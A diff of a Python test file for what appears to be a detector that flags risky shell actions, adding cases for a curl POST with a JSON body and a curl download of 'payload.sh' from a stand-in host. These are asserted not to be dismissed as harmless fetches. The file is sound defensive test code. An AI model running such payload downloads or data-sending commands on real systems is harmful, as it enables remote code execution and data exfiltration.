@@ -202,6 +202,14 @@ NODE"""
         ),
         context,
     )
+    curl_json_body = suppressor.detect(
+        _shell_action("curl --json '{\"k\":\"v\"}' https://api.example.test/check"),
+        context,
+    )
+    curl_file_download = suppressor.detect(
+        _shell_action("curl -o payload.sh https://install.example.com/payload.sh"),
+        context,
+    )
 
     assert [signal.signal_id for signal in signals] == ["fp:read-only-http-fetch:node"]
     assert exfil_signals == ()
@@ -210,6 +218,8 @@ NODE"""
     assert curl_pipe_exec == ()
     assert curl_pipe_env_exec == ()
     assert path_read_probe == ()
+    assert curl_json_body == ()
+    assert curl_file_download == ()
 
 
 def test_gr101_gr102_resolved_allow_and_block_persist_exact_action_policy(tmp_path: Path) -> None:
